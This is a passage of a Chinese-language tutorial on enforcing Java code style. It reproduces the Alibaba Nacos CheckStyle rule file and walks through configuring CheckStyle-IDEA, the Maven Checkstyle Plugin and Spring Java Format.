获取。 4、Spring 的 CheckStyle 规则文件可以从 GitHub 获取。 Alibaba Nacos 的 CheckStyle 规则文件如下，要求 CheckStyle 的版本至少为 8.30 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220&lt;?xml version="1.0"?&gt;&lt;!-- ~ Copyright 1999-2018 Alibaba Group Holding Ltd. ~ ~ Licensed under the Apache License, Version 2.0 (the "License"); ~ you may not use this file except in compliance with the License. ~ You may obtain a copy of the License at ~ ~ http://www.apache.org/licenses/LICENSE-2.0 ~ ~ Unless required by applicable law or agreed to in writing, software ~ distributed under the License is distributed on an "AS IS" BASIS, ~ WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. ~ See the License for the specific language governing permissions and ~ limitations under the License. --&gt;&lt;!DOCTYPE module PUBLIC "-//Checkstyle//DTD Checkstyle Configuration 1.3//EN" "https://checkstyle.org/dtds/configuration_1_3.dtd"&gt;&lt;module name="Checker"&gt; &lt;property name="charset" value="UTF-8"/&gt; &lt;property name="severity" value="error"/&gt; &lt;property name="fileExtensions" value="java, properties, xml"/&gt; &lt;module name="FileTabCharacter"&gt; &lt;property name="eachLine" value="true"/&gt; &lt;/module&gt; &lt;module name="LineLength"&gt; &lt;property name="fileExtensions" value="java"/&gt; &lt;property name="max" value="150"/&gt; &lt;property name="ignorePattern" value="^implements.*|^extends.*|^package.*|^import.*|a href|href|http://|https://|ftp://"/&gt; &lt;/module&gt; &lt;module name="SuppressWarningsFilter"/&gt; &lt;module name="TreeWalker"&gt; &lt;module name="SuppressionCommentFilter"/&gt; &lt;module name="SuppressWarningsHolder" /&gt; &lt;!-- Name Checker --&gt; &lt;module name="OuterTypeFilename"/&gt; &lt;module name="PackageName"&gt; &lt;property name="format" value="^[a-z]+(\\.[a-z][a-z0-9]*)*$"/&gt; &lt;message key="name.invalidPattern" value="Package name \'\'{0}\'\' must match pattern \'\'{1}\'\'."/&gt; &lt;/module&gt; &lt;module name="TypeName"/&gt; &lt;module name="MemberName"/&gt; &lt;module name="ParameterName"/&gt; &lt;module name="LambdaParameterName"/&gt; &lt;module name="CatchParameterName"/&gt; &lt;module name="LocalVariableName"/&gt; &lt;module name="ClassTypeParameterName"/&gt; &lt;module name="MethodTypeParameterName"/&gt; &lt;module name="InterfaceTypeParameterName"/&gt; &lt;module name="MethodName"/&gt; &lt;module name="ConstantName"/&gt; &lt;module name="StaticVariableName"/&gt; &lt;module name="AbbreviationAsWordInName"&gt; &lt;property name="ignoreFinal" value="false"/&gt; &lt;property name="allowedAbbreviationLength" value="1"/&gt; &lt;property name="allowedAbbreviations" value="VO"/&gt; &lt;/module&gt; &lt;!-- Import Checker --&gt; &lt;module name="AvoidStarImport"/&gt; &lt;module name="UnusedImports"/&gt; &lt;module name="RedundantImport"/&gt; &lt;!-- Block Checker --&gt; &lt;module name="EmptyBlock"&gt; &lt;property name="option" value="TEXT"/&gt; &lt;property name="tokens" value="LITERAL_TRY, LITERAL_FINALLY, LITERAL_IF, LITERAL_ELSE, LITERAL_SWITCH"/&gt; &lt;/module&gt; &lt;module name="EmptyCatchBlock"&gt; &lt;property name="exceptionVariableName" value="expected|ignore(d)?"/&gt; &lt;/module&gt; &lt;module name="LeftCurly"/&gt; &lt;module name="RightCurly"/&gt; &lt;module name="NeedBraces"/&gt; &lt;!-- Javadoc Checker --&gt; &lt;module name="JavadocMethod"&gt; &lt;property name="scope" value="public"/&gt; &lt;property name="allowMissingParamTags" value="true"/&gt; &lt;property name="allowMissingReturnTag" value="true"/&gt; &lt;property name="allowedAnnotations" value="Override, Test, Before, After, BeforeClass, AfterClass, Parameterized, Parameters, Bean"/&gt; &lt;property name="tokens" value="METHOD_DEF, CTOR_DEF, ANNOTATION_FIELD_DEF"/&gt; &lt;/module&gt; &lt;module name="MissingJavadocMethod"&gt; &lt;property name="scope" value="public"/&gt; &lt;property name="minLineCount" value="2"/&gt; &lt;property name="allowedAnnotations" value="Override, Test, Before, After, BeforeClass, AfterClass, Parameterized, Parameters, Bean"/&gt; &lt;property name="ignoreMethodNamesRegex" value="^set[A-Z].*|^get[A-Z].*|main"/&gt; &lt;property name="tokens" value="METHOD_DEF, ANNOTATION_FIELD_DEF"/&gt; &lt;/module&gt; &lt;module name="SingleLineJavadoc"&gt; &lt;property name="ignoreInlineTags" value="false"/&gt; &lt;/module&gt; &lt;module name="InvalidJavadocPosition"/&gt; &lt;module name="SummaryJavadoc"&gt; &lt;property name="forbiddenSummaryFragments" value="^@return the *|^This method returns |^A [{]@code [a-zA-Z0-9]+[}]( is a )"/&gt; &lt;/module&gt; &lt;module name="JavadocParagraph"/&gt; &lt;module name="NonEmptyAtclauseDescription"/&gt; &lt;!-- Coding Checker --&gt; &lt;module name="IllegalTokenText"&gt; &lt;property name="tokens" value="STRING_LITERAL, CHAR_LITERAL"/&gt; &lt;property name="format" value="\\\\u00(09|0(a|A)|0(c|C)|0(d|D)|22|27|5(C|c))|\\\\(0(10|11|12|14|15|42|47)|134)"/&gt; &lt;property name="message" value="Consider using special escape sequence instead of octal value or Unicode escaped value."/&gt; &lt;/module&gt; &lt;module name="OneStatementPerLine"/&gt; &lt;module name="MultipleVariableDeclarations"/&gt; &lt;module name="MissingSwitchDefault"/&gt; &lt;module name="FallThrough"/&gt; &lt;module name="NoFinalizer"/&gt; &lt;module name="OverloadMethodsDeclarationOrder"/&gt; &lt;module name="VariableDeclarationUsageDistance"/&gt; &lt;module name="AtclauseOrder"&gt; &lt;property name="tagOrder" value="@param, @return, @throws, @deprecated"/&gt; &lt;/module&gt; &lt;!-- Miscellaneous Checker --&gt; &lt;module name="AvoidEscapedUnicodeCharacters"&gt; &lt;property name="allowEscapesForControlCharacters" value="true"/&gt; &lt;property name="allowByTailComment" value="true"/&gt; &lt;property name="allowNonPrintableEscapes" value="true"/&gt; &lt;/module&gt; &lt;module name="Indentation"&gt; &lt;property name="arrayInitIndent" value="8"/&gt; &lt;property name="lineWrappingIndentation" value="8"/&gt; &lt;/module&gt; &lt;module name="CommentsIndentation"&gt; &lt;property name="tokens" value="SINGLE_LINE_COMMENT, BLOCK_COMMENT_BEGIN"/&gt; &lt;/module&gt; &lt;module name="ArrayTypeStyle"/&gt; &lt;module name="UpperEll"/&gt; &lt;!-- Design Checker --&gt; &lt;module name="OneTopLevelClass"/&gt; &lt;!-- Whitespace --&gt; &lt;module name="NoLineWrap"/&gt; &lt;module name="WhitespaceAfter"/&gt; &lt;module name="WhitespaceAround"&gt; &lt;property name="allowEmptyConstructors" value="true"/&gt; &lt;/module&gt; &lt;module name="EmptyLineSeparator"&gt; &lt;property name="allowMultipleEmptyLines" value="false"/&gt; &lt;property name="allowMultipleEmptyLinesInsideClassMembers" value="false"/&gt; &lt;/module&gt; &lt;module name="SeparatorWrap"&gt; &lt;property name="id" value="SeparatorWrapDot"/&gt; &lt;property name="tokens" value="DOT"/&gt; &lt;property name="option" value="nl"/&gt; &lt;/module&gt; &lt;module name="SeparatorWrap"&gt; &lt;property name="id" value="SeparatorWrapComma"/&gt; &lt;property name="tokens" value="COMMA"/&gt; &lt;property name="option" value="EOL"/&gt; &lt;/module&gt; &lt;module name="SeparatorWrap"&gt; &lt;property name="id" value="SeparatorWrapEllipsis"/&gt; &lt;property name="tokens" value="ELLIPSIS"/&gt; &lt;property name="option" value="EOL"/&gt; &lt;/module&gt; &lt;module name="SeparatorWrap"&gt; &lt;property name="id" value="SeparatorWrapArrayDeclarator"/&gt; &lt;property name="tokens" value="ARRAY_DECLARATOR"/&gt; &lt;property name="option" value="EOL"/&gt; &lt;/module&gt; &lt;module name="SeparatorWrap"&gt; &lt;property name="id" value="SeparatorWrapMethodRef"/&gt; &lt;property name="tokens" value="METHOD_REF"/&gt; &lt;property name="option" value="nl"/&gt; &lt;/module&gt; &lt;module name="GenericWhitespace"&gt; &lt;message key="ws.followed" value="GenericWhitespace \'\'{0}\'\' is followed by whitespace."/&gt; &lt;message key="ws.preceded" value="GenericWhitespace \'\'{0}\'\' is preceded with whitespace."/&gt; &lt;message key="ws.illegalFollow" value="GenericWhitespace \'\'{0}\'\' should followed by whitespace."/&gt; &lt;message key="ws.notPreceded" value="GenericWhitespace \'\'{0}\'\' is not preceded with whitespace."/&gt; &lt;/module&gt; &lt;module name="MethodParamPad"/&gt; &lt;module name="NoWhitespaceBefore"/&gt; &lt;module name="ParenPad"/&gt; &lt;module name="OperatorWrap"&gt; &lt;property name="option" value="NL"/&gt; &lt;property name="tokens" value="BAND, BOR, BSR, BXOR, DIV, EQUAL, GE, GT, LAND, LE, LITERAL_INSTANCEOF, LOR, LT, MINUS, MOD, NOT_EQUAL, PLUS, QUESTION, SL, SR, STAR, METHOD_REF "/&gt; &lt;/module&gt; &lt;!-- Modifier Checker --&gt; &lt;module name="ModifierOrder"/&gt; &lt;!-- Annotation Checker --&gt; &lt;module name="AnnotationLocation"&gt; &lt;property name="id" value="AnnotationLocationMostCases"/&gt; &lt;property name="tokens" value="CLASS_DEF, INTERFACE_DEF, ENUM_DEF, METHOD_DEF, CTOR_DEF"/&gt; &lt;/module&gt; &lt;module name="AnnotationLocation"&gt; &lt;property name="id" value="AnnotationLocationVariables"/&gt; &lt;property name="tokens" value="VARIABLE_DEF"/&gt; &lt;property name="allowSamelineMultipleAnnotations" value="true"/&gt; &lt;/module&gt; &lt;/module&gt;&lt;/module&gt; 插件安装 1、打开 IDEA 插件市场的界面 2、搜索 CheckStyle-IDEA，点击安装即可 插件配置导入规则文件 1、打开 CheckStyle 的配置界面（File –&gt; Settings –&gt; Tools –&gt; Checkstyle） 2、选择 Checkstyle 的版本为 8.39，这里的版本号必须与 checkstyle.xml 规则文件的内容相互匹配 3、选择 Scan Scope 扫描范围，若 checkstyle.xml 规则文件支持检测不同类型的文件（.java、.xml 等）的代码规范，则可以选择 All sources (including tests) 4、在界面上点击配置文件的添加按钮，配置描述可随便填写（例如 Custom Checks），然后选中项目里的 checkstyle.xml 规则文件，点击下一步和完成 5、在界面上勾选刚刚添加的配置文件 配置编辑器的代码检测规范 1、打开 IDEA 编辑器的配置界面（File –&gt; Settings –&gt; Editor –&gt; Code Style –&gt; Schema –&gt; Import Schema –&gt; CheckStyle Configuration） 2、导入项目中的 checkstyle.xml 规则文件，如下图所示： 配置编辑器的代码实时检测 1、打开 IDEA 编辑器的配置界面（File –&gt; Settings –&gt; Editor –&gt; Inspections） 2、勾选 Checkstyle real-time scan 选项，如下图所示： 配置编辑器提示信息的颜色在 IDEA 的编辑器内，默认的 CheckStyle 提示样式跟 IDEA 默认的差不多，两者并不好区分。若希望更改 CheckStyle 提示信息的颜色，可以按照以下步骤操作： 1、打开 CheckStyle 的颜色设置窗口（File –&gt; Settings –&gt; Editor –&gt; Inspections –&gt; CheckStyle –&gt; Severity –&gt; Edit severities） 2、更改不同类型的提示信息的颜色 插件使用 1、在 IDEA 界面内打开任意一个 Java 源文件 2、打开 IDEA 界面底部的 CheckStyle 操作面板，点击左侧的 绿色三角形 按钮，这样就可以检查单个 Java 源文件的代码规范 提示 CheckStyle 除了可以检测单个 Java 源文件的代码规范，还支持检测整个 Maven 模块（Check Module）或者整个项目（Check Project）的 Java 代码规范。 Maven 代码规范检测插件Maven Checkstyle Plugin 插件可用于检测 Java 代码规范，更详细的使用教程可看 官方文档。 创建规则文件在项目中创建 checkstyle.xml 规则文件，例如路径为 config/checkstyle/checkstyle.xml。Checkstyle 8.39 版本可使用的规则文件请参考 这里。 提示 1、Maven Checkstyle Plugin 与 Checkstyle 的版本对应关系请看 官方文档。 2、若不指定 checkstyle.xml 规则文件的路径，Maven Checkstyle Plugin 默认会从项目的根目录下搜索规则文件。 3、当 Maven Checkstyle Plugin 找不到对应的 checkstyle.xml 规则文件时，默认会使用内置的 sun_checks.xml 或者 google_checks.xml 规则文件。 配置插件Maven Checkstyle Plugin 3.2.0 默认使用的 Checkstyle 版本是 9.3，由于 Checkstyle 的版本必须与 checkstyle.xml 规则文件的内容互相匹配，因此需要引入 checkstyle 来指定 Checkstyle 的版本号，这样就可以很方便地兼容不同的规则文件了。 12345678910111213141516171819202122232425262728293031323334353637&lt;properties&gt; &lt;!-- 指定项目中自定义的 CheckStyle 规则文件 --&gt; &lt;checkstyle.config.location&gt;config/checkstyle/checkstyle.xml&lt;/checkstyle.config.location&gt;&lt;/properties&gt;&lt;build&gt; &lt;plugins&gt; &lt;!-- 代码规范检测插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.puppycrawl.tools&lt;/groupId&gt; &lt;artifactId&gt;checkstyle&lt;/artifactId&gt; &lt;version&gt;8.39&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;checkstyle-validation&lt;/id&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;configuration&gt; &lt;consoleOutput&gt;true&lt;/consoleOutput&gt; &lt;failsOnError&gt;true&lt;/failsOnError&gt; &lt;includeTestSourceDirectory&gt;true&lt;/includeTestSourceDirectory&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;check&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 现在切换到项目所在的目录下，就可以使用 mvn checkstyle:check 命令执行代码规范检测了，或者直接执行 mvn compile 命令。Maven Checkstyle Plugin 插件除了会在控制台打印代码规范的检测结果，还会将检测结果输出到项目的 target/checkstyle-result.xml 文件中。 123456789 &lt;executions&gt; &lt;execution&gt; &lt;id&gt;checkstyle-validation&lt;/id&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;check&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt;&lt;/executions&gt; 上述的 id 可以随意填写，phase 表示将插件绑定到 Maven Lifecycle 的 phase 中的哪个命令上。指定 phase 为 validate 后，当执行 mvn compile 命令时会执行 Maven CheckStyle Plugin 插件。若指定 phase 为 install，则表示绑定到 install 命令上，即当执行 maven install 命令的时候才会执行插件。 生成报告若希望 Maven Checkstyle Plugin 将代码规范的检测结果生成 HTML 报告，可以参考以下写法，详情可参考 官方文档。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;project&gt; &lt;properties&gt; &lt;!-- 指定项目中自定义的 CheckStyle 规则文件 --&gt; &lt;checkstyle.config.location&gt;config/checkstyle/checkstyle.xml&lt;/checkstyle.config.location&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugins&gt; &lt;!-- 站点生成插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt; &lt;version&gt;3.12.1&lt;/version&gt; &lt;/plugin&gt; &lt;!-- 代码规范检测插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.puppycrawl.tools&lt;/groupId&gt; &lt;artifactId&gt;checkstyle&lt;/artifactId&gt; &lt;version&gt;8.39&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;checkstyle-validation&lt;/id&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;configuration&gt; &lt;consoleOutput&gt;true&lt;/consoleOutput&gt; &lt;failsOnError&gt;true&lt;/failsOnError&gt; &lt;includeTestSourceDirectory&gt;true&lt;/includeTestSourceDirectory&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;check&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;!-- 生成的报告 --&gt; &lt;reporting&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/reporting&gt;&lt;/project&gt; 现在切换到项目所在的目录下，就可以使用 mvn checkstyle:checkstyle 命令生成代码规范检测结果的 HTML 报告了，或者使用 mvn site 命令（速度较慢，会生成多种类型的站点报告），默认会将检测报告输出到项目的 target/site/checkstyle.html 文件中。 错误级别在 checkstyle.xml 规则文件中，有以下的配置内容，表示当扫描到代码有不符合规范的地方时，指定错误级别为 error 1&lt;property name="severity" value="error"/&gt; Maven CheckStyle Plugin 有以下的配置内容，表示如果在扫描代码时遇到 error 级别的错误，就直接中断命令的执行；否则，只会生成检测结果文件，但不会中断命令的执行。 1&lt;failsOnError&gt;true&lt;/failsOnError&gt; CheckStyle 允许的错误级别有 error、warning、info，只有指定错误级别为 error，并配置了 failsOnError 才会中断命令的执行。命令中断执行后，会在对应的模块下生成 target/checkstyle-result.xml 检测结果文件。 多模块配置在企业开发中，一般会把项目的逻辑按照模块拆分出来，这样便于分离和解耦，项目脉络也更加清晰。在这种情况下，要为每个 Maven 模块创建 CheckStyle 任务，也就是需要放到 Parent 的 pom.xml 配置文件里。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;project&gt; &lt;properties&gt; &lt;!-- 指定项目中自定义的 CheckStyle 规则文件 --&gt; &lt;checkstyle.config.location&gt;config/checkstyle/checkstyle.xml&lt;/checkstyle.config.location&gt; &lt;/properties&gt; &lt;build&gt; &lt;!-- 公共的 CheckStyle 插件标准配置，可以在子模块中覆盖，并修改自定义选项 --&gt; &lt;pluginManagement&gt; &lt;plugins&gt; &lt;!-- 站点生成 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt; &lt;version&gt;3.12.1&lt;/version&gt; &lt;/plugin&gt; &lt;!-- 代码检测 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.puppycrawl.tools&lt;/groupId&gt; &lt;artifactId&gt;checkstyle&lt;/artifactId&gt; &lt;version&gt;8.39&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;checkstyle-validation&lt;/id&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;configuration&gt; &lt;consoleOutput&gt;true&lt;/consoleOutput&gt; &lt;failsOnError&gt;true&lt;/failsOnError&gt; &lt;includeTestSourceDirectory&gt;true&lt;/includeTestSourceDirectory&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;check&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;!-- 所有子模块都要执行的插件 --&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;reporting&gt; &lt;plugins&gt; &lt;!-- 所有子模块都要生成的报告 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/reporting&gt;&lt;/project&gt; 常见问题汇总无法打印检测结果首先，执行 Maven 代码规范检测插件的常用命令有两种： mvn checkstyle:check mvn checkstyle:checkstyle 特别注意的是，上述两个命令的执行效果是不一样的： 执行 mvn checkstyle:check 命令，控制台会显示 BUILD FAILURE，会打印详细的代码规范检测结果（警告或错误信息），同时还会将检测结果记录在 target/checkstyle-result.xml 文件里，不会生成 HTML 检测报告 执行 mvn checkstyle:checkstyle 命令，控制台会显示 BUILD SUCCESS，不会打印详细的代码规范检测结果（警告或错误信息），但会将检测结果记录在 target/checkstyle-result.xml 文件里，会生成 HTML 检测报告 提示 值得一提的是，mvn checkstyle:check 命令默认会绑定到 validate 阶段（phase），它将在编译代码之前检测代码的规范，详细说明请看 官方文档。 无法定位 XRef 资源若执行 mvn checkstyle:check 命令后，Maven 打印 Unable to locate Source XRef to link 这样的警告信息，可以在 pom.xml 配置文件中加入以下内容来解决： 123456789&lt;reporting&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-jxr-plugin&lt;/artifactId&gt; &lt;version&gt;2.3&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/reporting&gt; 忽略检测指定的子模块若不希望 Maven 的 CheckStyle 插件检测某些指定子模块的代码规范，可以在子模块下的 pom.xml 配置文件中，加入以下内容。 123&lt;properties&gt; &lt;checkstyle.skip&gt;true&lt;/checkstyle.skip&gt;&lt;/properties&gt; 代码格式化插件Maven 代码格式化插件Spring Java Format 插件集提供了一款格式化 Java 代码的 Maven 插件，默认使用 Spring 的代码规范，插件的运行依赖于 JDK 11+。在项目里配置好代码格式化的 Maven 插件后，可直接运行命令格式化项目代码： mvn spring-javaformat:apply 或者 ./mvnw spring-javaformat:apply。 基础配置在项目中的 pom.xml 配置文件中添加以下内容： 123456789&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;io.spring.javaformat&lt;/groupId&gt; &lt;artifactId&gt;spring-javaformat-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.0.35&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 现在切换到项目所在的目录下，就可以使用 mvn spring-javaformat:apply 或者 ./mvnw spring-javaformat:apply 命令批量格式化 Java 代码了。 强制格式化若希望强制所有代码都符合所需的规范，可以使用以下的插件配置内容： 123456789101112131415161718&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;io.spring.javaformat&lt;/groupId&gt; &lt;artifactId&gt;spring-javaformat-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.0.35&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;goals&gt; &lt;goal&gt;validate&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 提示 配置强制格式化代码后，如果 Maven 在编译项目时发现有代码的风格不符合 Spring 规范，会自动终止编译，直至所有代码的风格都符合 Spring 规范才会让项目正常编译。 强制检测特定的代码规范若希望在 Maven 编译之前，强制检测特定的代码规范，则可以在上述配置内容的基础上（如果只是想让 Maven 插件检测特定的代码规范，而不需要执行代码格式化，则可以不引入上述的配置内容），额外引入 CheckStyle 的 Maven 插件，并包含 spring-javaformat-checkstyle 依赖，然后指定 CheckStyle 的规则文件即可，具体的配置内容如下： 特别注意 1、配置了强制检测特定的代码规范之后，如果 Maven 在编译项目时发现有代码的风格不符合特定的代码规范，会自动终止编译，直至所有代码的风格都符合特定的代码规范才会让项目正常编译。 2、在下述的 Maven 配置内容中，checkstyle 依赖的版本必须与指定的 checkstyle.xml 规则文件的内容互相匹配，否则会影响 Maven 代码规范检测插件的运行。 3、下述的 Maven 配置内容，只是让 Maven 插件在编译代码之前强制检测特定的代码规范，而不是让 Maven 插件按照 CheckStyle 的规则文件来格式化代码，也就是说 Maven 插件最终还是会使用 Spring 的代码规范来进行格式化。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;properties&gt; &lt;!-- 指定项目中自定义的 CheckStyle 规则文件 --&gt; &lt;checkstyle.config.location&gt;config/checkstyle/checkstyle.xml&lt;/checkstyle.config.location&gt;&lt;/properties&gt;&lt;build&gt; &lt;plugins&gt; &lt;!-- 代码格式化插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;io.spring.javaformat&lt;/groupId&gt; &lt;artifactId&gt;spring-javaformat-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.0.35&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;goals&gt; &lt;goal&gt;validate&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- 代码规范检测插件 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-checkstyle-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.puppycrawl.tools&lt;/groupId&gt; &lt;artifactId&gt;checkstyle&lt;/artifactId&gt; &lt;version&gt;8.39&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.spring.javaformat&lt;/groupId&gt; &lt;artifactId&gt;spring-javaformat-checkstyle&lt;/artifactId&gt; &lt;version&gt;0.0.35&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;checkstyle-validation&lt;/id&gt; &lt;phase&gt;validate&lt;/phase&gt; &lt;inherited&gt;true&lt;/inherited&gt; &lt;configuration&gt; &lt;consoleOutput&gt;true&lt;/consoleOutput&gt; &lt;failsOnError&gt;true&lt;/failsOnError&gt; &lt;includeTestSourceDirectory&gt;true&lt;/includeTestSourceDirectory&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;check&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 现在切换到项目所在的目录下，就可以使用 mvn checkstyle:check 命令执行代码规范检测了，或者直接执行 mvn compile 命令。 配合 CheckStyle-IDEA 插件使用在 IDEA 里配置 CheckStyle-IDEA 代码规范检测插件，让 CheckStyle 默认使用 Spring 的代码规范来检测。 创建规则文件在项目中创建 checkstyle.xml 规则文件，并写入如下内容： 12345678&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE module PUBLIC "-//Checkstyle//DTD Checkstyle Configuration 1.3//EN" "https://checkstyle.org/dtds/configuration_1_3.dtd"&gt;&lt;module name="com.puppycrawl.tools.checkstyle.Checker"&gt; &lt;module name="io.spring.javaformat.checkstyle.SpringChecks" /&gt;&lt;/module&gt; 配置 CheckStyle-IDEA 插件 1、打开 CheckStyle 的配置界面（File –&gt; Settings –&gt; Tools –&gt; Checkstyle） 2、选择 Checkstyle 的版本，例如 8.39 3、在界面上点击配置文件的添加按钮，配置描述可随便填写（例如 Custom Checks），然后选中项目里的 checkstyle.xml 规则文件，点击下一步和完成 4、在界面上勾选刚刚添加的配置文件 5、下载 spring-javaformat-checkstyle-0.0.35.jar 与 spring-javaformat-config-0.0.35.jar 文件，并将它们添加到 Third-Party Checks IDEA 代码格式化插件IDEA 内置的格式化工具IDEA 可以使用内置工具格式化 Java 代码，格式化代码的快捷键是 CTRL + ALT + L。 代码风格配置若希望让 IDEA 默认使用特定的代码风格来格式化代码，可以参考以下配置步骤： 1、从 Nacos GitHub 下载 IDEA 的代码风格 XML 文件，这里使用 Alibaba Nacos 的代码风格（附上官方教程），也可以选择 Google GitHub 的代码风格 2、打开 IDEA 编辑器的配置界面（File –&gt; Settings –&gt; Editor –&gt; Code Style –&gt; Schema –&gt; Import Schema –&gt; IntelliJ IDEA code style XML） 3、导入 IDEA 的代码风格 XML 文件 单个格式化打开任意一个 Java 源文件，使用快捷键 CTRL + ALT + L 即可按照特定的代码风格来格式化单个源文件了。 批量格式化IDEA 支持代码批量格式化的功能，这样就不用手动使用快捷键格式化每个 Java 源文件了，而且基于上面 IDEA 代码格式化风格的配置，可以让 IDEA 按照特定的代码风格批量格式化，具体的操作步骤如下： 打开 IDEA 批量格式化代码的界面（右键项目 / 模块 –&gt; Reformat Code） 配置批量格式化的参数（如下图所示） 最后点击 Run 按钮 Spring Java Format 格式化插件Spring Java Format 提供了一款可以格式化 Java 代码的 IDEA 插件，可以从 Maven Central 下载，详细的使用教程请看官方文档。 最佳实践在企业项目开发中，推荐使用以下的技术组合来约束项目的代码风格。 推荐方案一 使用 IDEA 内置的代码格式化工具，基于 Google 或 Nacos 的 代码风格文件 使用 IDEA 的代码规范检测插件，基于 Google 或 Nacos 的 CheckStyle 规则文件 使用 Maven 的代码规范检测插件，基于 Google 或 Nacos 的 CheckStyle 规则文件 推荐方案二 Spring Java Format 的 IDEA 代码格式化插件 